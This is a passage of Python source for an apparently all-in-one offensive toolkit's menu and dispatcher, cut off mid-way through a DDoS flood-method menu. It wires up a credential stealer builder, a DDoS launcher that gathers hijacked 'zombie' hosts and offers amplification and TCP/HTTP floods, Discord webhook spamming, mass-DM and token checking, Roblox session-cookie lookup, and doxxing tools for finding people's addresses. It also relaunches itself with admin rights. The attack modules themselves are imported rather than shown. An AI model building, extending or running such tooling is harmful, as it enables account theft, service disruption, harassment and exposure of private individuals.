                operator_input = ui.console.input(f"[bold magenta]mainframe@advanced_audits:~# [ESC to return][/bold magenta] ").strip()
            else:
                operator_input = _get_tree_input(f"{tcolor}mainframe@advanced_audits:~# [ESC to return] {Colors.RESET}")
            
            if not _run_tool(deck_id, operator_input):
                break


        elif deck_id == "5":
            MainframeUI.display_attack_menu()
            if ui is not None:
                operator_input = ui.console.input(f"[bold red]mainframe@attack_vectors:~# [ESC to return][/bold red] ").strip()
            else:
                operator_input = _get_tree_input(f"{tcolor}mainframe@attack_vectors:~# [ESC to return] {Colors.RESET}")
            
            if not _run_tool(deck_id, operator_input):
                break


        elif deck_id == "6":
            MainframeUI.display_discord_menu()
            if ui is not None:
                operator_input = ui.console.input(f"[bold blue]mainframe@discord_tools:~# [ESC to return][/bold blue] ").strip()
            else:
                operator_input = _get_tree_input(f"{tcolor}mainframe@discord_tools:~# [ESC to return] {Colors.RESET}")
            
            if not _run_tool(deck_id, operator_input):
                break

        elif deck_id == "7":
            MainframeUI.display_dox_menu()
            if ui is not None:
                operator_input = ui.console.input(f"[bold red]mainframe@dox_tools:~# [ESC to return][/bold red] ").strip()
            else:
                operator_input = _get_tree_input(f"{tcolor}mainframe@dox_tools:~# [ESC to return] {Colors.RESET}")

            if not _run_tool(deck_id, operator_input):
                break

        elif deck_id == "8":
            MainframeUI.display_stealer_menu()
            if ui is not None:
                operator_input = ui.console.input(f"[bold red]mainframe@stealer_builder:~# [ESC to return][/bold red] ").strip()
            else:
                operator_input = _get_tree_input(f"{tcolor}mainframe@stealer_builder:~# [ESC to return] {Colors.RESET}")

            if not _run_tool(deck_id, operator_input):
                break

        elif deck_id == "9":
            MainframeUI.display_roblox_menu()
            if ui is not None:
                operator_input = ui.console.input(f"[bold green]mainframe@roblox_tools:~# [ESC to return][/bold green] ").strip()
            else:
                operator_input = _get_tree_input(f"{tcolor}mainframe@roblox_tools:~# [ESC to return] {Colors.RESET}")

            if not _run_tool(deck_id, operator_input):
                break

        else:
            break


os.system("chcp 65001 > nul")

def main():

    global _CURRENT_THEME

    if sys.platform.startswith('win'):
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                print("[!] Need admin rights, re-running as Administrator...")
                time.sleep(1)

                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit(0)
        except Exception as elevation_error:
            print(f"Windows privilege monitor initialization error: {elevation_error}")
            time.sleep(2)


    try:
        scrambler_thread = threading.Thread(target=title_scrambler_daemon, daemon=True)
        scrambler_thread.start()
    except Exception as scrambler_err:
        print(f"[!] Warning: Title matrix custom visual layer bypassed: {scrambler_err}")



    username = setup_or_login()
    _render_home()
    _session_start = time.time()

    while True:
        try:
            selection_target = input(f"{username}@mainframe:~/root/# ").strip()

            if selection_target == "help":
                print(_HELP_TEXT)
            elif selection_target == "tools":
                print(_TOOLS_TEXT)
            elif selection_target in ("credits", "credit"):
                print(_CREDITS_TEXT)
            elif selection_target in ("clear", "cls"):
                _render_home()
            elif selection_target == "exit":
                print("[!] Terminating session...")
                sys.exit(0)
            elif selection_target == "customize":
                if handle_customize is not None:
                    new_theme = handle_customize(_CURRENT_THEME)
                    if new_theme != _CURRENT_THEME:
                        _CURRENT_THEME = new_theme
                        os.system("cls" if os.name == "nt" else "clear")
                        show_theme(_CURRENT_THEME)
                        print(f"\n{Colors.GREEN}[+] Theme applied: {_CURRENT_THEME}{Colors.RESET}")
                        print(f'Type {Colors.CYAN}help{Colors.RESET} for a list of available commands.\n')
                else:
                    print(f"{Colors.YELLOW}[!] Theme engine not loaded.{Colors.RESET}")
                _render_home()
            elif selection_target in ("1", "2", "3", "4", "5", "6", "7", "8", "9"):
                handle_category_deck(selection_target)
                _render_home()
            elif selection_target == "10":
                print("[!] Terminating session...")
                sys.exit(0)
            else:
                print(f"Command '{selection_target}' not found. Type 'help' for options.\n")

        except KeyboardInterrupt:
            print("\n[!] Session interrupted. Disposing active frames...")
            sys.exit(0)
        except Exception as internal_error:
            print(f"\n[!] Master pipeline failure: {internal_error}")
            time.sleep(2)





_ABORT = {"active": False}


def _abort_watcher():
    if msvcrt is None:
        return
    while _ABORT.get("active"):
        try:
            if msvcrt.kbhit():
                ch = msvcrt.getwch()
                if ch in ('.', '\x1b', 'q'):
                    _ABORT["active"] = False
                    _thread.interrupt_main()
                    return
                try:
                    msvcrt.ungetch(ch)
                except Exception:
                    pass
        except Exception:
            return
        time.sleep(0.05)


def _not_loaded(name):
    print(f"{Colors.RED}[!] {name} module not loaded.{Colors.RESET}")


def _run_tool(deck_id, choice):

    actions = {
        "1": {
            "1": run_pinger_engine, "2": run_reverse_dns, "3": run_port_scanner,
            "4": run_ping_sweeper, "5": run_banner_grabber, "6": run_subdomain_finder,
            "7": run_rdap_lookup, "8": run_http_header_auditor, "9": run_doh_resolver,
            "10": run_ip_lookup, "11": "back",
        },
        "2": {
            "1": run_sherlock_hook, "2": run_phoneinfoga_hook, "3": run_holehe_hook,
            "4": run_socialscan_hook, "5": run_live_breach_checker, "6": run_threat_intel,
            "7": run_homograph_analyzer, "8": run_name_search, "9": run_reverse_image_search,
            "10": run_whois_lookup, "11": run_email_validator, "12": "back",
        },
        "3": {
            "1": run_traffic_monitor, "2": run_secret_scanner, "3": run_hash_matrix,
            "4": run_system_profiler, "5": run_base64_matrix,
            "6": _python_obfuscator_wrapper, "7": _python_deobfuscator_wrapper, "8": "back",
        },
        "4": {
            "1": run_file_integrity_monitor, "2": run_ssl_auditor, "3": run_connection_profiler,
            "4": run_password_auditor, "5": run_arp_profiler, "6": run_cidr_calculator,
            "7": run_upnp_discovery, "8": run_dns_spoof_auditor, "9": run_mac_vendor_lookup,
            "10": "back",
        },
        "5": {
            "1": _beast_mode_menu,
            "2": run_image_logger,
            "3": lambda: bruteforce_attack.start_bruteforce() if bruteforce_attack else _not_loaded("Brute Force"),
            "4": run_msfconsole, "5": run_msfvenom, "6": run_hashcat, "7": run_impacket,
            "8": run_log_diagnostic, "9": run_nmap_scan, "10": "back",
        },
        "6": {
            "1": _discord_token_info_wrapper,
            "2": _discord_token_checker_wrapper,
            "3": _discord_webhook_spammer_wrapper,
            "4": _discord_webhook_deleter_wrapper,
            "5": _discord_nitro_checker_wrapper,
            "6": _discord_server_info_wrapper,
            "7": _discord_server_cloner_wrapper,
            "8": _discord_mass_dm_wrapper,
            "9": "back",
        },
        "7": {
            "1": _dox_maker_wrapper,
            "2": _uk_address_lookup_wrapper,
            "3": _uk_name_search_wrapper,
            "4": "back",
        },
        "8": {
            "1": _stealer_builder_wrapper,
            "2": "back",
        },
        "9": {
            "1": _roblox_cookie_info_wrapper,
            "2": _roblox_id_info_wrapper,
            "3": _roblox_username_info_wrapper,
            "4": _roblox_group_info_wrapper,
            "5": _roblox_game_info_wrapper,
            "6": "back",
        },
    }
    table = actions.get(deck_id, {})
    action = table.get(choice)
    if choice == "back":
        return False
    if action is None:
        print(f"\n{Colors.RED}[!] Unknown instruction parameter sequence. Resetting workspace...{Colors.RESET}")
        time.sleep(1.2)
        return False
    if action == "back":
        return False

    _ABORT["active"] = True
    _ABORT["aborted"] = False
    watcher = threading.Thread(target=_abort_watcher, daemon=True)
    watcher.start()
    try:
        action()
    except KeyboardInterrupt:
        pass
    except Exception as tool_err:
        print(f"\n{Colors.RED}[!] Tool runtime error: {tool_err}{Colors.RESET}")
    finally:
        _ABORT["active"] = False
    if _ABORT.get("aborted"):
        print(f"\n{Colors.YELLOW}[!] Abort signal received. Returning to main menu.{Colors.RESET}")
        _ABORT["aborted"] = False
        return False
    return True


def _discord_token_info_wrapper():
    try:
        from core import discord_tools as dt
        token = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Enter Discord token: ").strip()
        if not token:
            print(f"{Colors.RED}[!] Token required.{Colors.RESET}")
            time.sleep(1.5)
            return
        info = dt.get_token_info(token)
        if info:
            print(f"\n{Colors.GREEN}[+] Token Valid{Colors.RESET}")
            for k, v in info.items():
                print(f"  {k}: {v}")
        else:
            print(f"\n{Colors.RED}[-] Invalid token.{Colors.RESET}")
        input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")
    except ImportError:
        _not_loaded("Discord Tools")


def _discord_token_checker_wrapper():
    try:
        from core import discord_tools as dt
        path = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Token list path: ").strip()
        if not path or not os.path.exists(path):
            print(f"{Colors.RED}[!] File not found.{Colors.RESET}")
            time.sleep(1.5)
            return
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            tokens = [line.strip() for line in f if line.strip()]
        valid = 0
        invalid = 0
        for token in tokens:
            ok, info = dt.check_token(token)
            if ok:
                valid += 1
                print(f"{Colors.GREEN}[VALID]{Colors.RESET} {info.get('username')}#{info.get('discriminator')}")
            else:
                invalid += 1
                print(f"{Colors.RED}[INVALID]{Colors.RESET} {token[:20]}...")
        print(f"\n{Colors.GREEN}Valid: {valid}{Colors.RESET} | {Colors.RED}Invalid: {invalid}{Colors.RESET}")
        input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")
    except ImportError:
        _not_loaded("Discord Tools")


def _discord_webhook_spammer_wrapper():
    try:
        from core import discord_tools as dt
        url = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Webhook URL: ").strip()
        if not url:
            print(f"{Colors.RED}[!] URL required.{Colors.RESET}")
            time.sleep(1.5)
            return
        msg = input(f"{Fore.MAGENTA}>{Fore.GREEN} Message: ").strip()
        count_str = input(f"{Fore.MAGENTA}>{Fore.GREEN} Count [Default: 10]: ").strip() or "10"
        try:
            count = max(1, min(500, int(count_str)))
        except ValueError:
            count = 10
        for i in range(count):
            try:
                dt.send_webhook(url, content=msg)
                print(f"{Colors.GREEN}[+] Sent message {i+1}/{count}{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[-] Failed: {e}{Colors.RESET}")
                break
        input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")
    except ImportError:
        _not_loaded("Discord Tools")


def _discord_webhook_deleter_wrapper():
    try:
        from core import discord_tools as dt
        url = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Webhook URL: ").strip()
        if not url:
            print(f"{Colors.RED}[!] URL required.{Colors.RESET}")
            time.sleep(1.5)
            return
        confirm = input(f"{Fore.YELLOW}Confirm delete? (y/n): {Fore.RESET}").strip().lower()
        if confirm != 'y':
            return
        code = dt.delete_webhook(url)
        if code == 204:
            print(f"{Colors.GREEN}[+] Webhook deleted.{Colors.RESET}")
        else:
            print(f"{Colors.RED}[-] Failed. HTTP {code}{Colors.RESET}")
        input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")
    except ImportError:
        _not_loaded("Discord Tools")


def _discord_nitro_checker_wrapper():
    try:
        from core import discord_tools as dt
        threads_str = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Threads [Default: 10]: ").strip() or "10"
        count_str = input(f"{Fore.MAGENTA}>{Fore.GREEN} Codes to check [Default: 50]: ").strip() or "50"
        try:
            threads = max(1, min(50, int(threads_str)))
            count = max(1, min(1000, int(count_str)))
        except ValueError:
            threads = 10
            count = 50
        print(f"\n{Colors.CYAN}[+] Starting nitro checker...{Colors.RESET}")
        valid = dt.start_nitro_checker(threads=threads, count=count)
        print(f"\n{Colors.GREEN}[+] Valid codes: {len(valid)}{Colors.RESET}")
        for code in valid:
            print(f"  {Colors.YELLOW}{code}{Colors.RESET}")
        input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")
    except ImportError:
        _not_loaded("Discord Tools")


def _discord_server_info_wrapper():
    try:
        from core import discord_tools as dt
        invite = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Invite code: ").strip()
        if not invite:
            print(f"{Colors.RED}[!] Invite code required.{Colors.RESET}")
            time.sleep(1.5)
            return
        info = dt.get_guild_info(invite)
        if info:
            print(f"\n{Colors.GREEN}[+] Server Info{Colors.RESET}")
            for k, v in info.items():
                print(f"  {k}: {v}")
        else:
            print(f"\n{Colors.RED}[-] Could not fetch server info.{Colors.RESET}")
        input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")
    except ImportError:
        _not_loaded("Discord Tools")


def _discord_server_cloner_wrapper():
    print(f"\n{Colors.AMBER}[!] Server cloning requires a valid bot token with Manage Channels/Roles permissions.{Colors.RESET}")
    print(f"{Colors.AMBER}    This creates new channels/roles on a destination server.{Colors.RESET}")
    token = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Bot token: ").strip()
    src_invite = input(f"{Fore.MAGENTA}>{Fore.GREEN} Source invite code: ").strip()
    dst_guild = input(f"{Fore.MAGENTA}>{Fore.GREEN} Destination guild ID: ").strip()
    if not all([token, src_invite, dst_guild]):
        print(f"{Colors.RED}[!] All fields required.{Colors.RESET}")
        time.sleep(1.5)
        return
    try:
        from core import discord_tools as dt
        dt.clone_server(token, src_invite, dst_guild)
    except ImportError:
        _not_loaded("Discord Tools")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
    input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")


def _discord_mass_dm_wrapper():
    print(f"\n{Colors.AMBER}[!] Mass DM requires a valid user token or bot token.{Colors.RESET}")
    token = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Token: ").strip()
    user_ids_path = input(f"{Fore.MAGENTA}>{Fore.GREEN} User IDs file path: ").strip()
    msg = input(f"{Fore.MAGENTA}>{Fore.GREEN} Message: ").strip()
    if not all([token, user_ids_path, msg]) or not os.path.exists(user_ids_path):
        print(f"{Colors.RED}[!] All fields required and file must exist.{Colors.RESET}")
        time.sleep(1.5)
        return
    try:
        from core import discord_tools as dt
        with open(user_ids_path, "r", encoding="utf-8", errors="ignore") as f:
            ids = [line.strip() for line in f if line.strip()]
        dt.mass_dm(token, ids, msg)
    except ImportError:
        _not_loaded("Discord Tools")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
    input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")


def _dox_maker_wrapper():
    try:
        from core import dox_tools as dt
        dt.run_dox_maker()
    except ImportError:
        _not_loaded("Dox Tools")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        input("Press Enter to return...")

def _uk_address_lookup_wrapper():
    try:
        from core.dox_tools import uk_lookup
        uk_lookup.run_uk_address_lookup()
    except ImportError:
        _not_loaded("Dox Tools")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        input("Press Enter to return...")

def _uk_name_search_wrapper():
    try:
        from core.dox_tools import uk_lookup
        uk_lookup.run_uk_name_search()
    except ImportError:
        _not_loaded("Dox Tools")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        input("Press Enter to return...")


def _stealer_builder_wrapper():
    try:
        from core import stealer_tools as st
        st.run_stealer_builder(ui=ui)
    except ImportError:
        _not_loaded("Stealer Tools")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        input("Press Enter to return...")


def _display_roblox_result(ui, title, data):
    if not data:
        return
    if "error" in data:
        if ui is not None:
            ui.error(data["error"])
        else:
            print(f"{Colors.RED}[!] {data['error']}{Colors.RESET}")
        return
    if ui is not None:
        rows = [(k.replace("_", " ").title(), str(v)) for k, v in data.items() if k not in {"shout", "roles"}]
        ui.result_table(title.upper(), ["FIELD", "VALUE"], rows, border_style="green")
        roles = data.get("roles")
        if roles:
            role_rows = [(f"Rank {rank}", f"{name} - {members} members") for name, members, rank in roles]
            ui.result_table("ROLES", ["RANK", "ROLE"], role_rows, border_style="cyan")
        shout = data.get("shout")
        if shout and shout.get("body"):
            poster = shout.get("poster", {}).get("username", "None")
            if ui is not None:
                ui.panel(f"Shout by {poster}: {shout['body'][:200]}", title="GROUP SHOUT", border_style="yellow")
            else:
                print(f"\n{Colors.CYAN}[!] Shout by {Colors.RED}{poster}{Colors.RESET} :{Colors.RED} {shout['body'][:200]}{Colors.RESET}")
    else:
        print(f"\n{Colors.GREEN}[+] {title}{Colors.RESET}")
        for k, v in data.items():
            if k in {"shout", "roles"}:
                continue
            print(f"  {k.replace('_', ' ').title():<20}: {Colors.RED}{v}{Colors.RESET}")
        roles = data.get("roles")
        if roles:
            print(f"\n{Colors.CYAN}[!] Roles:{Colors.RESET}")
            for role_name, role_members, role_rank in roles:
                print(f"  {Colors.RED}[{role_rank:3d}]{Colors.RESET} {role_name:<25}{Colors.RED} {f'{role_members:,}' if isinstance(role_members, int) else role_members} members{Colors.RESET}")
        shout = data.get("shout")
        if shout and shout.get("body"):
            poster = shout.get("poster", {}).get("username", "None")
            print(f"\n{Colors.CYAN}[!] Shout by {Colors.RED}{poster}{Colors.RESET} :{Colors.RED} {shout['body'][:200]}{Colors.RESET}")


def _roblox_cookie_info_wrapper():
    try:
        from core import roblox_tools as rt
        cookie = (ui.prompt_input(".ROBLOSECURITY cookie:") if ui is not None else input(f"\n{Fore.MAGENTA}>{Fore.GREEN} .ROBLOSECURITY cookie: ").strip())
        if not cookie:
            if ui is not None:
                ui.error("Cookie required.")
            else:
                print(f"{Colors.RED}[!] Cookie required.{Colors.RESET}")
            input("Press Enter to return...")
            return
        data = rt.get_cookie_info(cookie)
        _display_roblox_result(ui, "Cookie Information", data)
        input("Press Enter to return...")
    except ImportError:
        _not_loaded("Roblox Tools")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        input("Press Enter to return...")


def _roblox_id_info_wrapper():
    try:
        from core import roblox_tools as rt
        user_id = (ui.prompt_input("User ID:") if ui is not None else input(f"\n{Fore.MAGENTA}>{Fore.GREEN} User ID: ").strip())
        data = rt.get_id_info(user_id)
        _display_roblox_result(ui, "Id Information", data)
        input("Press Enter to return...")
    except ImportError:
        _not_loaded("Roblox Tools")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        input("Press Enter to return...")


def _roblox_username_info_wrapper():
    try:
        from core import roblox_tools as rt
        username = (ui.prompt_input("Username:") if ui is not None else input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Username: ").strip())
        data = rt.get_username_info(username)
        _display_roblox_result(ui, "Username Information", data)
        input("Press Enter to return...")
    except ImportError:
        _not_loaded("Roblox Tools")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        input("Press Enter to return...")


def _roblox_group_info_wrapper():
    try:
        from core import roblox_tools as rt
        group_id = (ui.prompt_input("Group ID:") if ui is not None else input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Group ID: ").strip())
        data = rt.get_group_info(group_id)
        _display_roblox_result(ui, "Group Information", data)
        input("Press Enter to return...")
    except ImportError:
        _not_loaded("Roblox Tools")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        input("Press Enter to return...")


def _roblox_game_info_wrapper():
    try:
        from core import roblox_tools as rt
        if ui is not None:
            choice = ui.console.input("[bold yellow]  [1] Universe ID  [2] Place ID [Default: 1]: [/bold yellow]").strip() or "1"
        else:
            print(f"\n{Colors.CYAN}[1] Universe ID{Colors.RESET}")
            print(f"{Colors.CYAN}[2] Place ID{Colors.RESET}")
            choice = input(f"{Fore.MAGENTA}>{Fore.GREEN} Choice: ").strip().lstrip("0")
        universe_id = None
        place_id = None
        if choice == "1":
            universe_id = (ui.prompt_input("Universe ID:") if ui is not None else input(f"{Fore.MAGENTA}>{Fore.GREEN} Universe ID: ").strip())
        elif choice == "2":
            place_id = (ui.prompt_input("Place ID:") if ui is not None else input(f"{Fore.MAGENTA}>{Fore.GREEN} Place ID: ").strip())
        else:
            if ui is not None:
                ui.error("Invalid choice.")
            else:
                print(f"{Colors.RED}[!] Invalid choice.{Colors.RESET}")
            input("Press Enter to return...")
            return
        data = rt.get_game_info(universe_id=universe_id, place_id=place_id)
        _display_roblox_result(ui, "Game Information", data)
        input("Press Enter to return...")
    except ImportError:
        _not_loaded("Roblox Tools")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        input("Press Enter to return...")


def run_profile_manager():
    try:
        from core.profiles import profiles as pm
    except ImportError:
        _not_loaded("Profiles")
        return

    while True:
        print(f"\n{Colors.CYAN}[CONFIG PROFILES]{Colors.RESET}")
        print(f"  [{Colors.AMBER}1{Colors.RESET}] List profiles")
        print(f"  [{Colors.AMBER}2{Colors.RESET}] Save current config")
        print(f"  [{Colors.AMBER}3{Colors.RESET}] Load profile")
        print(f"  [{Colors.AMBER}4{Colors.RESET}] Delete profile")
        print(f"  [{Colors.AMBER}5{Colors.RESET}] Return to Menu")
        choice = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Select: ").strip()
        if choice == '1':
            profiles = pm.list_profiles()
            print(f"\n{Colors.GREEN}Profiles:{Colors.RESET}")
            for p in profiles:
                print(f"  - {p}")
            if not profiles:
                print(f"  {Colors.AMBER}(none){Colors.RESET}")
        elif choice == '2':
            name = input(f"{Fore.MAGENTA}>{Fore.GREEN} Profile name: ").strip()
            if not name:
                continue
            print(f"{Fore.MAGENTA}>{Fore.GREEN} Enter JSON config (single line): {Fore.RESET}")
            raw = input().strip()
            try:
                data = json.loads(raw)
            except Exception:
                print(f"{Colors.RED}[!] Invalid JSON.{Colors.RESET}")
                continue
            if pm.save_profile(name, data):
                print(f"{Colors.GREEN}[+] Profile saved.{Colors.RESET}")
            else:
                print(f"{Colors.RED}[-] Failed to save.{Colors.RESET}")
        elif choice == '3':
            name = input(f"{Fore.MAGENTA}>{Fore.GREEN} Profile name: ").strip()
            data = pm.load_profile(name)
            if data:
                print(f"{Colors.GREEN}[+] Loaded profile:{Colors.RESET}")
                print(json.dumps(data, indent=2))
            else:
                print(f"{Colors.RED}[-] Profile not found.{Colors.RESET}")
        elif choice == '4':
            name = input(f"{Fore.MAGENTA}>{Fore.GREEN} Profile name: ").strip()
            if pm.delete_profile(name):
                print(f"{Colors.GREEN}[+] Deleted.{Colors.RESET}")
            else:
                print(f"{Colors.RED}[-] Failed.{Colors.RESET}")
        elif choice == '5':
            break
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Fore.RESET}")


def run_report_generator():
    try:
        from core.reports import reports as rpt
    except ImportError:
        _not_loaded("Reports")
        return

    print(f"\n{Colors.CYAN}[REPORT GENERATOR]{Colors.RESET}")
    title = input(f"{Fore.MAGENTA}>{Fore.GREEN} Report title: ").strip() or "Report"
    rows_str = input(f"{Fore.MAGENTA}>{Fore.GREEN} Number of rows [Default: 5]: ").strip() or "5"
    try:
        rows = max(1, min(200, int(rows_str)))
    except ValueError:
        rows = 5

    sections = []
    section = {
        "heading": "Summary",
        "headers": ["Field", "Value"],
        "rows": [
            ["Generated", datetime.now().strftime('%Y-%m-%d %H:%M:%S')],
            ["Total rows", str(rows)],
        ],
    }
    for i in range(rows):
        section["rows"].append([f"Item {i+1}", f"Sample value {i+1}"])
    sections.append(section)

    path = rpt.save_html_report(title, sections)
    if path:
        print(f"{Colors.GREEN}[+] Report saved to:{Colors.RESET} {path}")
    else:
        print(f"{Colors.RED}[-] Failed to generate report.{Colors.RESET}")
    input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")


def run_screenshot_capture():
    try:
        from core.screenshot.screenshot import ScreenshotEngine
        engine = ScreenshotEngine()
    except ImportError:
        _not_loaded("Screenshot")
        return

    while True:
        print(f"\n{Colors.CYAN}[SCREENSHOT CAPTURE]{Colors.RESET}")
        print(f"  [{Colors.AMBER}1{Colors.RESET}] One-shot capture")
        print(f"  [{Colors.AMBER}2{Colors.RESET}] Auto-capture every 5s")
        print(f"  [{Colors.AMBER}3{Colors.RESET}] Stop auto-capture")
        print(f"  [{Colors.AMBER}4{Colors.RESET}] Return to Menu")
        choice = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Select: ").strip()
        if choice == '1':
            path = engine.capture_once()
            if path:
                print(f"{Colors.GREEN}[+] Saved: {path}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[-] Capture failed.{Colors.RESET}")
        elif choice == '2':
            if engine.start_auto(interval=5):
                print(f"{Colors.GREEN}[+] Auto-capture started (every 5s).{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}[!] Already running.{Colors.RESET}")
        elif choice == '3':
            engine.stop()
            print(f"{Colors.GREEN}[+] Auto-capture stopped.{Colors.RESET}")
        elif choice == '4':
            engine.stop()
            break
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Fore.RESET}")


def _beast_mode_menu():
    if ddos_attack is None:
        _not_loaded("DDoS Attack")
        return

    if ui is not None:
        ui.section("BEAST MODE", "red", subtitle="DDoS launcher with zombie gathering and direct flood modes.")
    else:
        print(f"\n{Colors.RED}[BEAST MODE]{Colors.RESET}")

    if ui is not None:
        ui.console.print("  [1] Scan Dorks for zombies")
        ui.console.print("  [2] Send from this computer")
        choice = ui.console.input("\n[bold yellow]> Select method:[/bold yellow] ").strip()
    else:
        print(f"\n{Colors.GREEN}Select method:{Colors.RESET}")
        print("  [1] Scan Dorks for zombies")
        print("  [2] Send from this computer")
        choice = input(f"\n{Colors.BOLD}Enter choice (1-2): {Colors.RESET}").strip()

    if choice == "1":
        script_dir = os.path.dirname(os.path.abspath(__file__))
        dorks_file = os.path.join(script_dir, 'core', 'ddos_attack', 'dorks.txt')
        zombies_file = os.path.join(script_dir, 'core', 'ddos_attack', 'zombies.txt')

        if ui is not None:
            ui.console.print(f"\n[bold cyan]Dorks file:[/bold cyan] {dorks_file}")
            ui.console.print(f"[bold cyan]Zombies file:[/bold cyan] {zombies_file}")
            load_choice = ui.console.input("\n[bold yellow]> Load zombies from file instead of gathering? (y/n) [Default: n]:[/bold yellow] ").strip().lower() or "n"
        else:
            print(f"\nDorks file: {dorks_file}")
            print(f"Zombies file: {zombies_file}")
            load_choice = input("\nLoad zombies from file instead of gathering? (y/n) [Default: n]: ").strip().lower() or "n"

        if load_choice == 'y':
            if os.path.exists(zombies_file):
                ddos_attack.load_zombies(zombies_file)
                if ui is not None:
                    ui.success(f"Loaded {len(ddos_attack.zombies)} zombies from file.")
                else:
                    print(f"{Colors.GREEN}[+] Loaded {len(ddos_attack.zombies)} zombies from file.{Colors.RESET}")
            else:
                if ui is not None:
                    ui.error(f"Zombies file not found: {zombies_file}")
                else:
                    print(f"{Colors.RED}[!] Zombies file not found: {zombies_file}{Colors.RESET}")
                return
        else:
            if not os.path.exists(dorks_file):
                if ui is not None:
                    ui.error(f"Dorks file not found: {dorks_file}")
                else:
                    print(f"{Colors.RED}[!] Dorks file not found: {dorks_file}{Colors.RESET}")
                return

            try:
                max_zombies = int((ui.prompt_input("Max zombies to gather [Default: 50]:", "50")
                                   if ui is not None
                                   else input("Max zombies to gather [Default: 50]: ").strip() or "50"))
            except Exception:
                max_zombies = 50

            use_proxy_flag = False
            proxy_choice = (ui.console.input("[bold yellow]\n  Use proxies for dork scanning? (y/n) [Default: n]:[/bold yellow] ").strip().lower()
                            if ui is not None
                            else input(f"\n{Colors.BOLD}Use proxies for dork scanning? (y/n) [Default: n]: {Colors.RESET}").strip().lower())
            if proxy_choice == 'y':
                use_proxy_flag = True

            if use_proxy_flag:
                refresh_choice = (ui.console.input("[bold yellow]\n  Refresh proxy list from free sources? (y/n) [Default: n]: [/bold yellow] ").strip().lower()
                                  if ui is not None
                                  else input(f"\n{Colors.BOLD}Refresh proxy list from free sources? (y/n) [Default: n]: {Colors.RESET}").strip().lower())
                if refresh_choice == 'y':
                    try:
                        from core.ddos_attack.proxy_scraper import scrape_proxies
                        proxy_list_path = os.path.join(script_dir, 'core', 'free-proxy-list.txt')
                        scrape_proxies(output_file=proxy_list_path)
                    except Exception as e:
                        if ui is not None:
                            ui.warning(f"Proxy scraping failed: {e}")
                        else:
                            print(f"{Colors.AMBER}[!] Proxy scraping failed: {e}{Colors.RESET}")

            if ui is not None:
                ui.info("Gathering zombies from dorks...")
            else:
                print(f"{Colors.CYAN}[*] Gathering zombies from dorks..." + (" via proxies" if use_proxy_flag else "") + f"{Colors.RESET}")

            try:
                from core.ddos_attack.zombie_gatherer import gather_zombies
                gather_zombies(dorks_file, zombies_file, max_zombies=max_zombies, use_proxies=use_proxy_flag)
                ddos_attack.load_zombies(zombies_file)
                if ui is not None:
                    ui.success(f"Gathered and loaded {len(ddos_attack.zombies)} zombies.")
                else:
                    print(f"{Colors.GREEN}[+] Gathered and loaded {len(ddos_attack.zombies)} zombies.{Colors.RESET}")
            except Exception as e:
                if ui is not None:
                    ui.error(f"Zombie gathering failed: {e}")
                else:
                    print(f"{Colors.RED}[!] Zombie gathering failed: {e}{Colors.RESET}")
                return

        if not ddos_attack.zombies:
            if ui is not None:
                ui.error("No zombies available. Aborting.")
            else:
                print(f"{Colors.RED}[!] No zombies available. Aborting.{Colors.RESET}")
            return

        target_ip = (ui.prompt_input("Target IP >")
                     if ui is not None
                     else input(f"\n{Colors.BOLD}Target IP > {Colors.RESET}").strip())
        if not target_ip:
            return

        try:
            target_port = int((ui.prompt_input("Target port [Default: 80]:", "80")
                               if ui is not None
                               else input(f"Target port [Default: 80]: ").strip() or "80"))
        except Exception:
            target_port = 80

        if ui is not None:
            ui.console.print("\n[bold yellow]Select flood method:[/bold yellow]")
            ui.console.print("\n[bold yellow][+] L4 METHODS[/bold yellow]")
            ui.console.print("-" * 60)
            ui.console.print("  [1] UDP Reflection / Amplification")
            ui.console.print("  [2] TCP")
            ui.console.print("  [3] TCP ACK")
            ui.console.print("  [4] TCP FIN")
            ui.console.print("  [5] TCP XMAS")
            ui.console.print("\n[bold yellow][+] L7 METHODS[/bold yellow]")
            ui.console.print("-" * 60)
            ui.console.print("  [6] HTTP")
